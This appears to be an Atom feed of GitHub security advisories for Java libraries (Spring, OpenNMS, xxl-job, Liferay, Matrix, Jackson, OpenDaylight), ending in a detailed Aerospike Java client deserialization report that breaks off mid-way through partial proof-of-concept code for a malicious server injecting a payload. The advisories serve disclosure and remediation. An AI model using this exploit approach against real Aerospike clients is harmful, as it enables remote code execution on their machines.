<li><a href="https://lists.apache.org/thread.html/raf7ca57033e537e4f9d7df7f192fa6968c1e49409b2348e08d807ccb@%3Cuser.ignite.apache.org%3E">https://lists.apache.org/thread.html/raf7ca57033e537e4f9d7df7f192fa6968c1e49409b2348e08d807ccb@%3Cuser.ignite.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rb18ed999153ef0f0cb7af03efe0046c42c7242fd77fbd884a75ecfdc@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/rb18ed999153ef0f0cb7af03efe0046c42c7242fd77fbd884a75ecfdc@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rc9efaf6db98bee19db1bc911d0fa442287dac5cb229d4aaa08b6a13d@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rc9efaf6db98bee19db1bc911d0fa442287dac5cb229d4aaa08b6a13d@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rd462a8b0dfab4c15e67c0672cd3c211ecd0e4f018f824082ed54f665@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rd462a8b0dfab4c15e67c0672cd3c211ecd0e4f018f824082ed54f665@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/re014a49d77f038ba70e5e9934d400af6653e8c9ac110d32b1254127e@%3Cdev.ranger.apache.org%3E">https://lists.apache.org/thread.html/re014a49d77f038ba70e5e9934d400af6653e8c9ac110d32b1254127e@%3Cdev.ranger.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rf00d8f4101a1c1ea4de6ea1e09ddf7472cfd306745c90d6da87ae074@%3Cdev.hive.apache.org%3E">https://lists.apache.org/thread.html/rf00d8f4101a1c1ea4de6ea1e09ddf7472cfd306745c90d6da87ae074@%3Cdev.hive.apache.org%3E</a></li>
<li><a href="https://tanzu.vmware.com/security/cve-2020-5421">https://tanzu.vmware.com/security/cve-2020-5421</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20210513-0009/">https://security.netapp.com/advisory/ntap-20210513-0009/</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuApr2021.html">https://www.oracle.com/security-alerts/cpuApr2021.html</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2022.html">https://www.oracle.com/security-alerts/cpujan2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2022.html">https://www.oracle.com/security-alerts/cpuapr2022.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rv39-3qh7-9v7w">https://github.com/advisories/GHSA-rv39-3qh7-9v7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv39-3qh7-9v7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-04-30T17:29:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-framework-bom] Improper Input Validation in Spring Framework]]></title>
        <id>https://github.com/advisories/GHSA-rv39-3qh7-9v7w</id>
        <link href="https://github.com/advisories/GHSA-rv39-3qh7-9v7w"/>
        <updated>2023-08-13T05:02:01.000Z</updated>
        <content type="html"><![CDATA[<p>In Spring Framework versions 5.2.0 - 5.2.8, 5.1.0 - 5.1.17, 5.0.0 - 5.0.18, 4.3.0 - 4.3.28, and older unsupported versions, the protections against RFD attacks from CVE-2015-5211 may be bypassed depending on the browser used through the use of a jsessionid path parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5421">https://nvd.nist.gov/vuln/detail/CVE-2020-5421</a></li>
<li><a href="https://lists.apache.org/thread.html/r1c679c43fa4f7846d748a937955c7921436d1b315445978254442163@%3Ccommits.ambari.apache.org%3E">https://lists.apache.org/thread.html/r1c679c43fa4f7846d748a937955c7921436d1b315445978254442163@%3Ccommits.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r1eccdbd7986618a7319ee7a533bd9d9bf6e8678e59dd4cca9b5b2d7a@%3Cissues.ambari.apache.org%3E">https://lists.apache.org/thread.html/r1eccdbd7986618a7319ee7a533bd9d9bf6e8678e59dd4cca9b5b2d7a@%3Cissues.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r3589ed0d18edeb79028615080d5a0e8878856436bb91774a3196d9eb@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r3589ed0d18edeb79028615080d5a0e8878856436bb91774a3196d9eb@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r503e64b43a57fd68229cac4a869d1a9a2eac9e75f8719cad3a840211@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r503e64b43a57fd68229cac4a869d1a9a2eac9e75f8719cad3a840211@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r5c95eff679dfc642e9e4ab5ac6d202248a59cb1e9457cfbe8b729ac5@%3Cissues.ambari.apache.org%3E">https://lists.apache.org/thread.html/r5c95eff679dfc642e9e4ab5ac6d202248a59cb1e9457cfbe8b729ac5@%3Cissues.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r7e6a213eea7f04fc6d9e3bd6eb8d68c4df92a22e956e95cb2c482865@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r7e6a213eea7f04fc6d9e3bd6eb8d68c4df92a22e956e95cb2c482865@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r8b496b1743d128e6861ee0ed3c3c48cc56c505b38f84fa5baf7ae33a@%3Cdev.ambari.apache.org%3E">https://lists.apache.org/thread.html/r8b496b1743d128e6861ee0ed3c3c48cc56c505b38f84fa5baf7ae33a@%3Cdev.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r918caad55dcc640a16753b00d8d6acb90b4e36de4b6156d0867246ec@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r918caad55dcc640a16753b00d8d6acb90b4e36de4b6156d0867246ec@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9f13cccb214495e14648d2c9b8f2c6072fd5219e74502dd35ede81e1@%3Cdev.ambari.apache.org%3E">https://lists.apache.org/thread.html/r9f13cccb214495e14648d2c9b8f2c6072fd5219e74502dd35ede81e1@%3Cdev.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra889d95141059c6cbe77dd80249bb488ae53b274b5f3abad09d9511d@%3Cuser.ignite.apache.org%3E">https://lists.apache.org/thread.html/ra889d95141059c6cbe77dd80249bb488ae53b274b5f3abad09d9511d@%3Cuser.ignite.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/raf7ca57033e537e4f9d7df7f192fa6968c1e49409b2348e08d807ccb@%3Cuser.ignite.apache.org%3E">https://lists.apache.org/thread.html/raf7ca57033e537e4f9d7df7f192fa6968c1e49409b2348e08d807ccb@%3Cuser.ignite.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rb18ed999153ef0f0cb7af03efe0046c42c7242fd77fbd884a75ecfdc@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/rb18ed999153ef0f0cb7af03efe0046c42c7242fd77fbd884a75ecfdc@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rc9efaf6db98bee19db1bc911d0fa442287dac5cb229d4aaa08b6a13d@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rc9efaf6db98bee19db1bc911d0fa442287dac5cb229d4aaa08b6a13d@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rd462a8b0dfab4c15e67c0672cd3c211ecd0e4f018f824082ed54f665@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rd462a8b0dfab4c15e67c0672cd3c211ecd0e4f018f824082ed54f665@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/re014a49d77f038ba70e5e9934d400af6653e8c9ac110d32b1254127e@%3Cdev.ranger.apache.org%3E">https://lists.apache.org/thread.html/re014a49d77f038ba70e5e9934d400af6653e8c9ac110d32b1254127e@%3Cdev.ranger.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rf00d8f4101a1c1ea4de6ea1e09ddf7472cfd306745c90d6da87ae074@%3Cdev.hive.apache.org%3E">https://lists.apache.org/thread.html/rf00d8f4101a1c1ea4de6ea1e09ddf7472cfd306745c90d6da87ae074@%3Cdev.hive.apache.org%3E</a></li>
<li><a href="https://tanzu.vmware.com/security/cve-2020-5421">https://tanzu.vmware.com/security/cve-2020-5421</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20210513-0009/">https://security.netapp.com/advisory/ntap-20210513-0009/</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuApr2021.html">https://www.oracle.com/security-alerts/cpuApr2021.html</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2022.html">https://www.oracle.com/security-alerts/cpujan2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2022.html">https://www.oracle.com/security-alerts/cpuapr2022.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rv39-3qh7-9v7w">https://github.com/advisories/GHSA-rv39-3qh7-9v7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv39-3qh7-9v7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-04-30T17:29:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.opennms.core:org.opennms.core.xml] OpenMNS Horizon XXE Injection Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2qc8-r663-v864</id>
        <link href="https://github.com/advisories/GHSA-2qc8-r663-v864"/>
        <updated>2023-08-11T23:04:52.000Z</updated>
        <content type="html"><![CDATA[<p>XXE injection in <code>/rtc/post/ endpoint</code> in OpenMNS Horizon 31.0.8 and versions earlier than 32.0.2 on multiple platforms&nbsp;is vulnerable to XML external entity (XXE) injection, which can be used for instance to force Horizon to make arbitrary HTTP requests to internal and external services.&nbsp;The solution is to upgrade to Meridian 2023.1.6, 2022.1.19, 2021.1.30, 2020.1.38 or Horizon 32.0.2 or newer. Meridian and Horizon installation instructions state that they are intended for installation within an organization's private networks and should not be directly accessible from the Internet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0871">https://nvd.nist.gov/vuln/detail/CVE-2023-0871</a></li>
<li><a href="https://github.com/OpenNMS/opennms/pull/6355">https://github.com/OpenNMS/opennms/pull/6355</a></li>
<li><a href="https://docs.opennms.com/horizon/32/releasenotes/changelog.html">https://docs.opennms.com/horizon/32/releasenotes/changelog.html</a></li>
<li><a href="https://github.com/OpenNMS/opennms/commit/5a3b0b62e0c612c9e2aa2c91c847abec71d767d5">https://github.com/OpenNMS/opennms/commit/5a3b0b62e0c612c9e2aa2c91c847abec71d767d5</a></li>
<li><a href="https://github.com/advisories/GHSA-2qc8-r663-v864">https://github.com/advisories/GHSA-2qc8-r663-v864</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qc8-r663-v864</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-08-11T18:31:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.xuxueli:xxl-job] xuxueli xxl-job Cross-Site Request Forgery Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jp5r-4x9q-4vcf</id>
        <link href="https://github.com/advisories/GHSA-jp5r-4x9q-4vcf"/>
        <updated>2023-08-11T21:11:21.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Request Forgery (CSRF) vulnerability in <code>xxl-job-admin/user/add</code> in xuxueli xxl-job version 2.2.0 allows remote attackers to execute arbitrary code and esclate privileges via crafted .html file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-24922">https://nvd.nist.gov/vuln/detail/CVE-2020-24922</a></li>
<li><a href="https://github.com/xuxueli/xxl-job/issues/1921">https://github.com/xuxueli/xxl-job/issues/1921</a></li>
<li><a href="https://github.com/advisories/GHSA-jp5r-4x9q-4vcf">https://github.com/advisories/GHSA-jp5r-4x9q-4vcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jp5r-4x9q-4vcf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-08-11T15:30:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.liferay.portal:release.portal.bom] Exposure of Resource to Wrong Sphere in Liferay Portal]]></title>
        <id>https://github.com/advisories/GHSA-6xxc-4jc4-7jv3</id>
        <link href="https://github.com/advisories/GHSA-6xxc-4jc4-7jv3"/>
        <updated>2023-08-09T13:17:27.000Z</updated>
        <content type="html"><![CDATA[<p>Liferay Portal 7.2.0 through 7.3.2, and Liferay DXP 7.2 before fix pack 9, allows access to Cross-origin resource sharing (CORS) protected resources if the user is only authenticated using the portal session authentication, which allows remote attackers to obtain sensitive information including the targeted user’s email address and current CSRF token.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33330">https://nvd.nist.gov/vuln/detail/CVE-2021-33330</a></li>
<li><a href="https://issues.liferay.com/browse/LPE-17127">https://issues.liferay.com/browse/LPE-17127</a></li>
<li><a href="https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/120747720">https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/120747720</a></li>
<li><a href="https://github.com/advisories/GHSA-6xxc-4jc4-7jv3">https://github.com/advisories/GHSA-6xxc-4jc4-7jv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xxc-4jc4-7jv3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T22:28:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.matrix.android:matrix-android-sdk2] Logic error in Matrix SDK for Android]]></title>
        <id>https://github.com/advisories/GHSA-jjmc-4p83-pp26</id>
        <link href="https://github.com/advisories/GHSA-jjmc-4p83-pp26"/>
        <updated>2023-08-09T13:17:08.000Z</updated>
        <content type="html"><![CDATA[<p>A logic error in the room key sharing functionality of Element Android before 1.2.2 and matrix-android-sdk2 (aka Matrix SDK for Android) before 1.2.2 leads to a situation where identity verification is inadequate and thus a key-requesting device can be impersonated.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-40824">https://nvd.nist.gov/vuln/detail/CVE-2021-40824</a></li>
<li><a href="https://github.com/matrix-org/matrix-android-sdk2/releases/tag/v1.2.2">https://github.com/matrix-org/matrix-android-sdk2/releases/tag/v1.2.2</a></li>
<li><a href="https://matrix.org/blog/2021/09/13/vulnerability-disclosure-key-sharing">https://matrix.org/blog/2021/09/13/vulnerability-disclosure-key-sharing</a></li>
<li><a href="https://github.com/advisories/GHSA-jjmc-4p83-pp26">https://github.com/advisories/GHSA-jjmc-4p83-pp26</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjmc-4p83-pp26</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T19:14:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.fasterxml.jackson.dataformat:jackson-dataformats-text] Denial of service in jackson-dataformats-text]]></title>
        <id>https://github.com/advisories/GHSA-rg2c-cfxv-qp6f</id>
        <link href="https://github.com/advisories/GHSA-rg2c-cfxv-qp6f"/>
        <updated>2023-08-09T12:52:22.000Z</updated>
        <content type="html"><![CDATA[<p>Those using jackson-dataformats-text to parse TOML data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3894">https://nvd.nist.gov/vuln/detail/CVE-2023-3894</a></li>
<li><a href="https://github.com/FasterXML/jackson-dataformats-text/pull/398">https://github.com/FasterXML/jackson-dataformats-text/pull/398</a></li>
<li><a href="https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=50083">https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=50083</a></li>
<li><a href="https://github.com/FasterXML/jackson-dataformats-text/blob/2.16/release-notes/VERSION-2.x">https://github.com/FasterXML/jackson-dataformats-text/blob/2.16/release-notes/VERSION-2.x</a></li>
<li><a href="https://github.com/FasterXML/jackson-dataformats-text/commit/5dd5f740aedcf37adad7ffece460e75e54abb0ed">https://github.com/FasterXML/jackson-dataformats-text/commit/5dd5f740aedcf37adad7ffece460e75e54abb0ed</a></li>
<li><a href="https://github.com/advisories/GHSA-rg2c-cfxv-qp6f">https://github.com/advisories/GHSA-rg2c-cfxv-qp6f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg2c-cfxv-qp6f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-08-08T18:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.opendaylight.controller:releasepom] OpenDaylight NULL Pointer Dereference]]></title>
        <id>https://github.com/advisories/GHSA-gjq3-997p-hg6f</id>
        <link href="https://github.com/advisories/GHSA-gjq3-997p-hg6f"/>
        <updated>2023-08-09T05:02:44.000Z</updated>
        <content type="html"><![CDATA[<p>StreamCorruptedException and NullPointerException in OpenDaylight odl-mdsal-xsql. Controller launches exceptions in the console. Component: OpenDaylight odl-mdsal-xsql is vulnerable to this flaw. Version: The tested versions are OpenDaylight 3.3 and 4.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000360">https://nvd.nist.gov/vuln/detail/CVE-2017-1000360</a></li>
<li><a href="https://aaltodoc.aalto.fi/bitstream/handle/123456789/21584/master_Bidaj_Andi_2016.pdf">https://aaltodoc.aalto.fi/bitstream/handle/123456789/21584/master_Bidaj_Andi_2016.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-gjq3-997p-hg6f">https://github.com/advisories/GHSA-gjq3-997p-hg6f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gjq3-997p-hg6f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:41:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses]]></title>
        <id>https://github.com/advisories/GHSA-jj95-55cr-9597</id>
        <link href="https://github.com/advisories/GHSA-jj95-55cr-9597"/>
        <updated>2023-08-08T14:55:46.000Z</updated>
        <content type="html"><![CDATA[<h1 id="github-security-lab-ghsl-vulnerability-report-ghsl-2023-044">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href="https://github.com/aerospike/aerospike-client-java/">Aerospike Java Client</a>.</p>
<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>
<h2 id="product">Product</h2>
<p>Aerospike Java Client</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7">6.1.7</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-unsafe-deserialization-of-server-responses-ghsl-2023-044">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>
<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>
<pre><code class="language-java">@Override
public void channelRead(ChannelHandlerContext ctx, Object msg) {
    command.read((ByteBuf)msg);
}
</code></pre>
<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code — for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>
<pre><code class="language-java">private void read(ByteBuf byteBuffer) {
    eventReceived = true;

    try {
        switch (state) {
            // --snip--
            case AsyncCommand.COMMAND_READ_HEADER:
                if (command.isSingle) {
                    readSingleHeader(byteBuffer);
                }
                // --snip--
        }
        // --snip--
    }
    // --snip---
}
</code></pre>
<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>
<pre><code class="language-java">private void readSingleHeader(ByteBuf byteBuffer) {
    int readableBytes = byteBuffer.readableBytes();
    int dataSize = command.dataOffset + readableBytes;

    // --snip--

    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);
    command.dataOffset = dataSize;

    if (command.dataOffset &gt;= receiveSize) {
        parseSingleBody();
    }
}
</code></pre>
<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>
<pre><code class="language-java">@Override
protected final boolean parseResult() {
    validateHeaderSize();

    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;
    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);
    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);
    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);
    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);
    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;

    if (resultCode == 0) {
        // --snip--
        skipKey(fieldCount);
        record = parseRecord(opCount, generation, expiration, isOperation);
        return true;
    }
</code></pre>
<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>
<pre><code class="language-java">protected final Record parseRecord(
    int opCount,
    int generation,
    int expiration,
    boolean isOperation
)  {
    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();

    for (int i = 0 ; i &lt; opCount; i++) {
        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);
        byte particleType = dataBuffer[dataOffset + 5];
        byte nameSize = dataBuffer[dataOffset + 7];
        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);
        dataOffset += 4 + 4 + nameSize;

        int particleBytesSize = opSize - (4 + nameSize);
        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);
</code></pre>
<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>
<pre><code class="language-java">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)
    throws AerospikeException {
        switch (type) {
            // --snip--
            case ParticleType.JBLOB:
                return Buffer.bytesToObject(buf, offset, len);
</code></pre>
<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>
<pre><code class="language-java">public static Object bytesToObject(byte[] buf, int offset, int length) {
    // --snip--
    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {
        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
            return oistream.readObject();
        }
    }
    // --snip--
}
</code></pre>
<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>
<pre><code class="language-java">private T unpackBlob(int count) throws IOException, ClassNotFoundException {
    // --snip--
    case ParticleType.JBLOB:
        // --snip--
        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {
            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
                val = getJavaBlob(oistream.readObject());
            }
        }
</code></pre>
<p>This vulnerability was discovered with the help of <a href="https://codeql.github.com/">CodeQL</a>.</p>
<h4 id="impact">Impact</h4>
<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>
<h4 id="remediation">Remediation</h4>
<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>
<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>
<h4 id="resources">Resources</h4>
<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>
<pre><code class="language-java">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {
        // --snip--
        if (s.getBytes()[7] == 0x44) {
            AttackMessage m = new AttackMessage(
                    Files.readAllBytes(Paths.get("location/of/deserialization/payload.bin")));
            ctx.channel().writeAndFlush(m);
            return;
        }
        // --snip--
    }
}
</code></pre>
<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>
<pre><code class="language-java">public class AttackMessage {

    private byte resultCode = 0;
    private int generation = 2;
    private int expiration = 417523457;
    private short fieldCount = 0;
    private short opCount = 1;
    private byte particleType = 7;
    private String name = "putgetbin";
    private byte[] payload;

    public AttackMessage(byte[] payload) {
        this.payload = payload;
    }

    // --snip-- (getters)

    public int[] getSize() {
